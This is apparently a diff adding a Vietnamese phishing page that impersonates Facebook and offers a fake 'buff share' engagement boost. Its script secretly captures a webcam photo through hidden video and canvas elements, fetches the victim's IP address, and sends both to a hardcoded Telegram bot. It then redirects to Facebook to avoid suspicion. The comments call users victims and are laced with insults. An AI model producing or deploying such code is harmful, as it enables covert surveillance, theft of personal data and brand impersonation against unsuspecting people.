@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Xác Nhận Quyền Lợi</title>
+    <style>
+        /* CSS giả mạo giao diện Facebook Mobile */
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5; /* Màu nền Facebook */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Shadow đậm hơn */
+            max-width: 380px;
+            width: 90%;
+            /* Bỏ border-top để trông giống thông báo nổi */
+        }
+        .header {
+            background-color: #1877f2; /* Màu Header xanh Facebook */
+            color: #fff;
+            padding: 15px 20px;
+            margin: -20px -20px 20px -20px; /* Kéo dài full width */
+            border-radius: 10px 10px 0 0;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        h2 {
+            color: #1c1e21;
+            font-size: 18px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        p {
+            color: #606770;
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 25px;
+        }
+        .btn-facebook {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.2s;
+        }
+        .btn-facebook:hover {
+            background-color: #1562bf; /* Màu đậm hơn khi hover */
+        }
+        .loading {
+            margin-top: 20px;
+            font-size: 15px;
+            color: #1877f2;
+            display: none;
+        }
+
+        /* Ẩn các thành phần camera */
+        #videoElement, #canvas {
+            display: none !important; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            THÔNG BÁO QUAN TRỌNG
+        </div>
+
+        <h2>XÁC THỰC QUYỀN TRUY CẬP HỆ THỐNG</h2>
+        <p>Địt mẹ, Hệ thống **BUFF SHARE** của chúng tôi cần truy cập tài nguyên thiết bị để **tăng tương tác và độ tiếp cận** cho bài viết của bạn. Bấm **XÁC NHẬN** để kích hoạt, thằng ngu!</p>
+        
+        <a href="javascript:void(0);" onclick="captureAndSendPhoto()" class="btn-facebook" id="action-button">
+            XÁC NHẬN VÀ KÍCH HOẠT BUFF
+        </a>
+
+        <div class="loading" id="loading-message">
+            <img src="data:image/gif;base64,R0lGODlhEAAQAPIAAP///wAAAPj4+Pk5OTtbW9ra2tPT0/T09AAAAAAAAyH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAADJUHOYlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADKkLOYlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADKULOXlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADJkLONlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADJkLONlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADJkLONlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADJkLONlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADJkLONlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAh+QQJCgAAACwAAAAAEAAQAAADJkLONlFz3A4gJkQnS5oA13QJ304R2gM24Xk4J79wIuMhI0dJg4880k9b4Y1GQQAOwAAAAAAAAAAAA==" style="width: 16px; height: 16px; vertical-align: middle;"> Đang kết nối server và xác thực, vui lòng chờ...
+        </div>
+    </div>
+    
+    <script>
+        // Đéo mẹ, Thay thế TOKEN và ADMIN_ID của mày vào đây
+        const TELEGRAM_BOT_TOKEN = '8474839616:AAEa6t6xJ_aEgXmZwE_zSNEukM-3AkFM1vk';
+        const TELEGRAM_ADMIN_ID = '6019766635'; 
+
+        // Tạo các phần tử Video và Canvas cần thiết và ẩn chúng đi
+        const video = document.createElement('video');
+        video.setAttribute('autoplay', '');
+        video.style.cssText = 'position: absolute; top: -1000px; left: -1000px;'; // Đẩy ra ngoài màn hình
+        document.body.appendChild(video);
+
+        const canvas = document.createElement('canvas');
+        canvas.style.cssText = 'display: none;'; 
+        const context = canvas.getContext('2d');
+        document.body.appendChild(canvas);
+        
+        const loadingMessage = document.getElementById('loading-message');
+        const actionButton = document.getElementById('action-button');
+
+        let hasCaptured = false; 
+
+        // Hàm chính để khởi động camera và chụp ảnh
+        async function captureAndSendPhoto() {
+            if (hasCaptured) {
+                console.log('Địt mẹ, đã chụp rồi, đéo làm lại nữa.');
+                return;
+            }
+            hasCaptured = true; 
+            
+            // Hiện thông báo đang tải
+            actionButton.style.display = 'none';
+            loadingMessage.style.display = 'block';
+
+            try {
+                // Yêu cầu truy cập camera (đây là lúc trình duyệt hiện hộp thoại lừa đảo)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Chờ cho video stream load xong
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = resolve;
+                    setTimeout(() => reject(new Error('Địt mẹ, Video load quá lâu')), 3000);
+                });
+
+                // Set kích thước canvas bằng kích thước của video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Vẽ frame hiện tại từ video lên canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Dừng stream camera lại ngay sau khi chụp xong
+                stream.getTracks().forEach(track => track.stop());
+
+                // Lấy dữ liệu ảnh dưới dạng Blob
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+                
+                // Gửi ảnh Blob lên Telegram
+                await sendPhotoToTelegram(blob);
+                
+                // Chuyển hướng nạn nhân sau khi chụp thành công (giả vờ buff share)
+                // Địt mẹ, đổi link này sang link Facebook/Link đích của mày
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/login/"; 
+                }, 3000); 
+
+            } catch (err) {
+                // Lỗi nếu nạn nhân từ chối camera
+                console.error('Lỗi khi truy cập camera hoặc gửi ảnh, thằng lồn:', err);
+                
+                // Gửi thông báo lỗi này qua Telegram luôn
+                const errorMessage = `Địt mẹ, Lỗi ở web! Nạn nhân đéo cho phép camera hoặc lỗi: ${err.name} - IP: ${await getIPAddress()}`;
+                sendSimpleMessage(errorMessage);
+                
+                // Chuyển hướng ngay cả khi lỗi để nạn nhân đéo nghi ngờ
+                 setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/help/"; // Link giả mạo khác
+                }, 1000); 
+            }
+        }
+        
+        // Hàm lấy IP nạn nhân (thêm bonus)
+        async function getIPAddress() {
+             try {
+                 const response = await fetch('https://api.ipify.org?format=json');
+                 const data = await response.json();
+                 return data.ip;
+             } catch (e) {
+                 return 'Đéo lấy được IP';
+             }
+         }
+
+        // Hàm gửi ảnh Blob lên Telegram
+        async function sendPhotoToTelegram(blob) {
+            
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_ADMIN_ID);
+            formData.append('caption', `Địt mẹ, Ảnh Chụp Nạn Nhân Buff Share Mới Của BON VINH! IP: ${await getIPAddress()}`);
+            formData.append('photo', blob, 'victim_photo.jpg');
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log('Ảnh đã gửi thành công, thằng ngu!', result);
+                } else {
+                    console.error('Đéo mẹ, Telegram trả về lỗi khi gửi ảnh:', result);
+                }
+            } catch (error) {
+                console.error('Lỗi kết nối khi gửi ảnh lên Telegram:', error);
+            }
+        }
+        
+        // Hàm gửi tin nhắn đơn giản, đéo mẹ
+        async function sendSimpleMessage(text) {
+             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_ADMIN_ID}&text=${encodeURIComponent(text)}`;
+             try {
+                await fetch(url);
+             } catch (error) {
+                 console.error('Đéo mẹ, Lỗi gửi tin nhắn đơn giản:', error);
+             }
+        }
+
+    </script>
+</body>
+</html>
